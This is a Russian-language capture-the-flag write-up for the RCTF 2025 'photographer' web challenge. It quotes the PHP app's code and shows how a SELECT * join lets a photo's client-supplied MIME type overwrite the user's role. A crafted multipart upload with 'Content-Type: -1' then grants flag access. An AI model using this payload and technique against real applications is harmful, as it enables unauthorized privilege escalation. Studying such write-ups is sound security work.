# photographer
**RCTF 2025**

Приложение - сервис для загрузки фото. Точкой входа является `public/index.php`, которая отвечает за загрузку фреймворка, инициализацию сервиса аутентификации и роутинг. Запросы перезаписываются в файле Apache `.htaccess`, а затем маршрутизатор направляет их в эту точку входа, которая сопоставляет URL с методом контроллера. Код точки входа выглядит следующим образом:
```
// public/index.php
require_once __DIR__ . '/../app/config/autoload.php';
Auth::init();
$router = new Router();
$routeLoader = require __DIR__ . '/../app/config/router.php';
$routeLoader($router);
$router->dispatch();
```
Сервис аутентификации в методе `Auth::init()` считывает текущий идентификатор пользователя из сеанса и запрашивает объект пользователя из БД. Нужно заметить, что этот запрос объединяет таблицу `user` с таблицей `photo` и использует `SELECT *`.
```
// app/middlewares/Auth.php
class Auth {
    private static $user = null;
    public static function init() {
        if (session_status() === PHP_SESSION_NONE) {
            session_name(config('session.name'));
            session_start();
        }
        if (isset($_SESSION['user_id'])) {
            self::$user = User::findById($_SESSION['user_id']);
        }
    }
    public static function type() { return self::$user['type']; }
}
```
Авторизация пользователя происходит за счет сравнения значения типа пользователя со значением `admin` (которое равно 0) с помощью сравнения `<`. Другими словами, флаг могут прочитать только пользователи со значением типа меньше 0. Код выглядит следующим образом:
```
// public/superadmin.php
Auth::init();
$user_types = config('user_types');
if (Auth::check() && Auth::type() < $user_types['admin']) {
    echo getenv('FLAG') ?: 'RCTF{test_flag}';
} else {
    header('Location: /');
}
```
В коде типов пользователей всего 3:
```
// app/config/config.php
'user_types' => [
    'admin' => 0,
    'auditor' => 1,
    'user' => 2
],
```
Типов с отрицательным значением там нет, значит нам нужно искать уязвимость в другом месте. Вернемся к запросу `User::findById`. Он объединяет таблицы `user` и `photo` с помощью `LEFT JOIN`, а затем использует `SELECT *`, который объединяет столбцы обеих таблиц в один ассоциативный массив.
```
// app/models/User.php
public static function findById($userId) {
    return DB::table('user')
        ->leftJoin('photo', 'user.background_photo_id', '=', 'photo.id')
        ->where('user.id', '=', $userId)
        ->first();
}
```
Если в таблицах существуют столбцы с одинаковыми именами, правая таблица переопределит левую. Таблица `user` имеет столбец `type` (роль пользователя), таблица `photo` также имеет `type` (MIME-тип изображения). Следовательно, после установки фонового изображения `user.background_photo_id`, которое является записью в таблице `photo`, можно добиться, что поле `type` в результате запроса `User::findById` будет взято из `photo.type`, а не из `user.type`. `Auth::type()` фактически считывает поле `type` изображения. Таким образом, если нам нужно сделать значение `type` для загруженного изображения отрицательным.

`type` изображения берется напрямую из `$_FILES['type']` при загрузке файла. `$_FILES['type']` определяется `Content-Type` в заголовке файла в `multipart/form-data` запросе, то есть это значение полностью контролируется клиентом.
```
// app/controllers/PhotoController.php
$result = Photo::create([
    'user_id' => Auth::id(),
    'original_filename' => $file['name'],
    'saved_filename' => $savedFilename,
    'type' => $file['type'],
    'size' => $file['size'],
    ...
]);
```
Функция проверки изображения `isValidImage` не проверяет и не нормализует тип содержимого, отправленный клиентом - она проверяет только расширение файла, размер и возможность чтения базовой информации функцией `getimagesize`.
```
// framework/helpers.php
function isValidImage($file) {
    $allowedExtensions = config('upload.allowed_extensions');
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowedExtensions)) return false;
    if ($file['size'] > config('upload.max_size')) return false;
    $imageInfo = @getimagesize($file['tmp_name']);
    if ($imageInfo === false) return false;
    return true;
}
```
Поэтому мы можем загрузить корректный файл PNG/JPG для выполнения этих проверок и записать `Content-Type: -1` в заголовок файла в запросе.
```
POST /api/photos/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="photos[]"; filename="x.png"
Content-Type: -1

PNG_BYTES...
------X--
```
Таким образом нам нужно:
1. Зарегистрировать пользователя;
2. Отправить `multipart/form-data` запрос с PNG изображением и `Content-Type: -1` для заголовка файла;
3. Установить загруженный PNG в качестве фонового изображения;
4. Перейти на `superadmin.php`.

[solve.py](https://github.com/andreika47/Quiet-CTF/blob/main/photographer/solve.py)

#web #file #upload #auth
